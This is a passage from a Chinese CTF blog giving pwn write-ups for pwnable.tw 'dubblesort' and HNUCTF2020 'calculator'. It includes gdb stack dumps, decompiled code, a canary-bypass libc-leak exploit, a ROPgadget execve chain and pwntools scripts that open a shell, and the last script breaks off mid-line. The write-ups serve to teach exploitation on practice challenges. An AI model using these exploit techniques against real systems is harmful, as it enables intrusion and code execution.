class="number">0x1</span></span><br><span class="line"><span class="number">1d</span>:<span class="number">0074</span>│          <span class="number">0xffffd224</span> —▸ <span class="number">0xffffd2e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">1e:<span class="number">0078</span>│          <span class="number">0xffffd228</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">1f:007c│          <span class="number">0xffffd22c</span> ◂— <span class="number">0x19d01800</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0080</span>│          <span class="number">0xffffd230</span> —▸ <span class="number">0xf7fd03dc</span> —▸ <span class="number">0xf7fd11e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0084</span>│          <span class="number">0xffffd234</span> —▸ <span class="number">0xffffd47b</span> ◂— <span class="string">'i686'</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0088</span>│          <span class="number">0xffffd238</span> —▸ <span class="number">0x56555b2b</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x1475</span></span><br><span class="line"><span class="number">23</span>:008c│          <span class="number">0xffffd23c</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0090</span>│          <span class="number">0xffffd240</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">26</span>:<span class="number">0098</span>│ <span class="built_in">ebp</span>      <span class="number">0xffffd248</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">27</span>:009c│          <span class="number">0xffffd24c</span> —▸ <span class="number">0xf7e38637</span> (__libc_start_main+<span class="number">247</span>) ◂— <span class="keyword">add</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></span><br><span class="line"><span class="number">28</span>:00a0│          <span class="number">0xffffd250</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">29</span>:00a4│          <span class="number">0xffffd254</span> —▸ <span class="number">0xffffd2e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">2a:00a8│          <span class="number">0xffffd258</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">2b:00ac│          <span class="number">0xffffd25c</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">2e:00b8│          <span class="number">0xffffd268</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">2f:00bc│          <span class="number">0xffffd26c</span> —▸ <span class="number">0xf7ffdc04</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">30</span>:00c0│          <span class="number">0xffffd270</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">31</span>:00c4│          <span class="number">0xffffd274</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>再看看此时的内存分布情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x56555000 0x56556000 r-xp     1000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0x56556000 0x56557000 r--p     1000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0x56557000 0x5655a000 rw-p     3000 1000   &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0xf7e1f000 0xf7e20000 rw-p     1000 0</span><br><span class="line">0xf7e20000 0xf7fcd000 r-xp   1ad000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fcd000 0xf7fce000 ---p     1000 1ad000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fce000 0xf7fd0000 r--p     2000 1ad000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fd0000 0xf7fd1000 rw-p     1000 1af000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fd1000 0xf7fd5000 rw-p     4000 0</span><br><span class="line">0xf7fd5000 0xf7fd8000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p     1000 22000  &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p     1000 23000  &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xfff00000 0xffffe000 rw-p    fe000 0      [stack]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通过以上信息，我们可以得知，栈上有一个指向<code>libc</code>的指针（位于上面的<code>0xffffd208</code>处）</p>
</li>
</ul>
</li>
<li>
<p>所以，通过<code>scanf</code>将栈上指向<code>libc</code>的指针的值泄露出来，再减去相应的偏移值，我们就可以得到<code>libc base</code>，进而得到<code>system addr</code>和<code>/bin/sh addr</code>。</p>
</li>
<li>
<p>接下来我们就得将<code>system addr</code>和<code>/bin/sh addr</code>送到<code>old eip</code>和<code>old eip - 4*2</code>处</p>
<ul>
<li>位置的变化我们可以利用程序中的<code>dubblesort</code>函数
<ul>
<li>注意<code>dubblesort</code>是将数据从小到大依次排序，所以我们需要精心构造栈上的值，设置不同的大小，<br>
从而使<code>canary</code>在排序过后还是在原来的地方，而<code>system addr</code>和<code>/bin/sh addr</code>换到我们需要的位置</li>
</ul>
</li>
<li>但当程序让我们输入<code>n</code>个数时，原来在栈上的数据就会被覆盖，而<code>Canary</code>自然也不例外。<br>
所以我们需要在正常结束当前<code>scanf</code>调用的情况下，不修改该<code>scanf</code>存放新数字的栈位置上的值
<ul>
<li>我们可以利用<code>scanf</code>的如下特性来完成我们的目的：
<blockquote>
<p>当<code>scanf</code>只读取到<code>“+”</code>或<code>“-”</code>时，<code>scanf</code>不做任何操作，所以存放新数字的栈位置上的值可以得以保留。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="解决方案-3">解决方案</h3>
<ol>
<li>构建特殊字符串，泄露<code>libc base</code></li>
<li>精心布置栈上数据，利用<code>dubblesort</code>将我们构建的<code>system addr</code>和<code>'/bin/sh' addr</code> 换到<code>old eip</code> 和 <code>old eip - 2 * 4</code> 这两个位置。</li>
<li>待程序执行冒泡排序后，<code>ret</code>即可<code>get shell</code>。</li>
</ol>
<h4 id="EXP-3">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10101</span>)</span><br><span class="line"><span class="comment"># io = process("./dubblesort")</span></span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露栈上数据， 得到libc base</span></span><br><span class="line">io.sendafter(<span class="string">"What your name :"</span>, <span class="string">"a"</span>*<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">libc_base = u32(io.recv(<span class="number">40</span>)[<span class="number">34</span>:<span class="number">38</span>]) - <span class="number">0x1ae244</span></span><br><span class="line">shell_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment"># 注意： shell_addr &gt; system_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布置栈上数据</span></span><br><span class="line">io.sendlineafter(<span class="string">"How many numbers do you what to sort :"</span>, <span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"number : "</span>, <span class="string">"0"</span>)</span><br><span class="line"><span class="comment"># 绕过canary，不修改它</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, <span class="string">"+"</span>)</span><br><span class="line"><span class="comment"># 修改canary之后的9个值</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, str(system_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"number : "</span>, str(system_addr - i))</span><br><span class="line"><span class="comment"># 写入参数</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, str(shell_addr))</span><br><span class="line"><span class="comment"># 丢弃垃圾信息</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="随笔-2">随笔</h3>
<p>这题的关键在于认识到栈上数据的敏感性。<br>
尽管当前函数并没有写入什么数据到栈上，但栈上却残留着上一个函数遗留下的信息。<br>
好好利用一番也可得到意外的收获。（亏我当初看<code>dubblesort</code>排序函数看了辣么久…）</p>
<h3 id="参考-3">参考</h3>
<blockquote>
<p><a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">关于不同版本 glibc 更换的一些问题</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>HNUCTF2020 部分题解</title>
    <url>/2020/02/HNUCTF2020-pwn/</url>
    <content><![CDATA[<p>HNUCTF2020新生赛 部分pwn题题解</p>
<h2 id="1-calculator">1. calculator</h2>
<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn6.zip" title="这里">这里</a> 下载题目</p>
<h3 id="查看保护">查看保护</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Kiprey:~/Desktop/HNUCTF/pwn# checksec pwn6</span><br><span class="line">[*] '/root/Desktop/HNUCTF/pwn/pwn6'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="漏洞函数">漏洞函数</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// [sp+18h] [bp-5A0h]@4</span></span><br><span class="line">    <span class="keyword">int</span> v2[<span class="number">100</span>]; <span class="comment">// [sp+1Ch] [bp-59Ch]@5</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+1ACh] [bp-40Ch]@2</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+5ACh] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">    v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        bzero(&amp;s, <span class="number">0x400</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( !get_expr((<span class="keyword">int</span>)&amp;s, <span class="number">0x400</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        init_pool(&amp;v1);</span><br><span class="line">        <span class="keyword">if</span> ( parse_expr((<span class="keyword">int</span>)&amp;s, &amp;v1) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_80BF804, v2[v1 - <span class="number">1</span>]);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@3</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// eax@6</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// ebx@25</span></span><br><span class="line">    _BYTE *v6; <span class="comment">// [sp+20h] [bp-88h]@1</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [sp+24h] [bp-84h]@1</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [sp+28h] [bp-80h]@1</span></span><br><span class="line">    <span class="keyword">char</span> *s1; <span class="comment">// [sp+30h] [bp-78h]@3</span></span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// [sp+34h] [bp-74h]@5</span></span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [sp+38h] [bp-70h]@1</span></span><br><span class="line">    <span class="keyword">int</span> v12; <span class="comment">// [sp+9Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">    v12 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">    v6 = (_BYTE *)a1;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    bzero(s, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="comment">// 注意，程序中将\0也视为运算符进行处理</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断是否为运算符，如果是，则进入，并处理当前运算符之前的数据</span></span><br><span class="line">        <span class="comment">//当程序读取到运算符时会处理之前的数据，例如1+2会将1存起来</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_BYTE *)(i + a1) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 得到当前运算符与上一个运算符之间的位数</span></span><br><span class="line">            v2 = i + a1 - (_DWORD)v6;</span><br><span class="line">            <span class="comment">// s1指向  当前运算符前、存放数字的char数组</span></span><br><span class="line">            s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(s1, v6, v2);</span><br><span class="line">            s1[v2] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"0"</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">                result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">            v10 = atoi((<span class="keyword">int</span>)s1);</span><br><span class="line">            <span class="comment">// 如果读取进来的数据是错误的，那么这个错误的数据将不会存储</span></span><br><span class="line">            <span class="keyword">if</span> ( v10 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// a2[0] 数字个数 +1</span></span><br><span class="line">                v4 = (*a2)++;</span><br><span class="line">                <span class="comment">// 将atoi得到的数字存起来</span></span><br><span class="line">                a2[v4 + <span class="number">1</span>] = v10;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断当前运算符是否为\0,或者+-*/%后面是不是数字，如果不是则进入if</span></span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)(i + a1) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_BYTE *)(i + <span class="number">1</span> + a1) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">                result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 得到指向运算符后的数字的指针</span></span><br><span class="line">            v6 = (_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">            <span class="comment">// 判断之前是否已经存了一个运算符</span></span><br><span class="line">            <span class="keyword">if</span> ( s[v8] )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 根据不同的运算符使用不同的运算方式</span></span><br><span class="line">                <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="comment">// 当遇到优先级较低的 + - 时</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                    <span class="comment">// 处理上一个运算符</span></span><br><span class="line">                    eval(a2, s[v8]);</span><br><span class="line">                    <span class="comment">// 把当前运算符存到上一个运算符存储的地方</span></span><br><span class="line">                    s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 当遇到优先级较高的 % * / 时</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                    <span class="comment">// 如果存储的上一个运算符不是+ -</span></span><br><span class="line">                    <span class="keyword">if</span> ( s[v8] != <span class="string">'+'</span> &amp;&amp; s[v8] != <span class="string">'-'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 那么就处理上一个运算符</span></span><br><span class="line">                        eval(a2, s[v8]);</span><br><span class="line">                        <span class="comment">// 并把当前运算符存到上一个运算符存储的位置</span></span><br><span class="line">                        s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>    <span class="comment">// 否则</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 上一个运算符不做处理，并将当前运算符存储起来</span></span><br><span class="line">                        s[++v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 由于当前的运算符为\0，则处理上一个运算符，并减去存储运算符的数组索引</span></span><br><span class="line">                    eval(a2, s[v8--]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将运算符存储起来</span></span><br><span class="line">                s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果当前运算符为\0，即整行处理完成，则退出</span></span><br><span class="line">            <span class="keyword">if</span> ( !*(_BYTE *)(i + a1) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 按照正常流程，处理完所有运算符之后，v8一定会小于0。如果不小于0，则说明还有运算符没处理</span></span><br><span class="line">    <span class="keyword">while</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">        eval(a2, s[v8--]);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">    LABEL_25:</span><br><span class="line">    v5 = *MK_FP(__GS__, <span class="number">20</span>) ^ v12;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="易知信息">易知信息</h3>
<ul>
<li>程序执行时，会先提示用户输入算式，例如<code>1+2*3</code>，然后执行代码算出所输入的算式的值，进而输出结果</li>
<li>程序静态链接，ret2libc 不可用</li>
<li>开启 Canary，不可直接栈溢出</li>
<li>开启 NX，堆栈不可执行</li>
<li>main 函数（没贴出来）有简单的反调试机制（alarm)</li>
<li>calc 函数里有不可直接使用的栈溢出</li>
<li>calc 函数里调用的 get_expr 函数只允许读取 0-9 ±*/% 这些符号</li>
</ul>
<h3 id="分析">分析</h3>
<ul>
<li>分析 <code>parse_expr</code> 函数，可以得知参数 <code>a2</code> 的结构
<ul>
<li><code>a2[0]</code>存放的是 <code>a2</code> 数组当前存放的数字个数（不包括 <code>a2[0]</code>）</li>
<li>新添加的数会存放到 <code>a2[a2[0]]</code>这个位置，同时 <code>a2[0]</code>++</li>
</ul>
</li>
<li>分析 <code>parse_expr</code> 函数， 可以得知此函数的处理逻辑
<ul>
<li>此函数会先遍历输入的字符串，直到遍历到第一个运算符。再将这个运算符前的上一个数字存入 <code>a2[a2[0]++]</code>。之后处理 <code>a2[a2[0] - 1]</code>与 <code>a2[a2[0] - 2]</code>的运算（执行 eval 函数）<br>
（此处概括不太全面，建议结合上面的伪代码和注释理解，（实际上结合汇编理解更佳）</li>
</ul>
</li>
<li>eval 函数（没贴出来）会计算 <code>a2[a2[0] - 1]</code>与 <code>a2[a2[0] - 2]</code>, 并将结果存放到 <code>a2[a2[0] - 2]</code>，同时 <code>a2[0]</code>--</li>
<li>分析 <code>calc</code> 函数，可以得知程序最后会输出 <code>a2[a2[0]]</code></li>
</ul>
<h3 id="解决方案">解决方案</h3>
<ul>
<li>
<p>综上分析，只要我们成功劫持 <code>a2[0]</code>，将其修改为我们需要的值，那么就可以任意查看栈上的值</p>
</li>
<li>
<p>同时，由于劫持了 <code>a2[0]</code>，我们同样可以实现栈上任意地址写入,因为“新添加的数会存放到 <code>a2[a2[0]]</code>这个位置”</p>
</li>
<li>
<p>所以我们只要将运算结果写入 <code>a2[0]</code>处，就可劫持成功，即输入以运算符开头的字符串，即可劫持。然后就可以栈区任意读写了。</p>
</li>
<li>
<p>由于该程序是静态链接，无法 <code>ret2libc</code> 。但正因为是静态链接，所以程序中有大量可用的 ROP 片段。通过 ROPgadget，可以得到 ROPchain，从而 get shell</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481d1</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701d1</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049a21</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>注意点:</p>
<ul>
<li>应当先查看 <code>canary</code> 值并记录，以便于在向栈写入数据后可以覆写 <code>canary</code> ，从而通过 <code>Canary</code> 的检测</li>
<li>写入数据时应当反序写入，即先写入远离 <code>Canary</code> 那端的栈空间，最后在写入距离 <code>Canary</code> 较近的栈空间，因为写入远离 <code>Canary</code> 那端的栈空间时会破坏距离 <code>Canary</code> 较近的栈空间上的数据</li>
</ul>
</li>
</ul>
<h4 id="EXP">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比赛IP被我隐藏了XD</span></span><br><span class="line">io = remote(<span class="string">"xx.xx.xx.xx"</span>, <span class="number">8012</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取canary, 传入+357</span></span><br><span class="line">canary_offset = <span class="number">357</span></span><br><span class="line">io.sendlineafter(<span class="string">"记住，未来，是创造就对了~\n"</span>, <span class="string">"+"</span> + str(canary_offset))</span><br><span class="line">canary_str = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">canary = int(canary_str)</span><br><span class="line"><span class="comment"># 如果读取到的canary为负, 根据atoi函数的特性，没办法模拟，只能退出重来</span></span><br><span class="line"><span class="keyword">if</span> canary &lt; <span 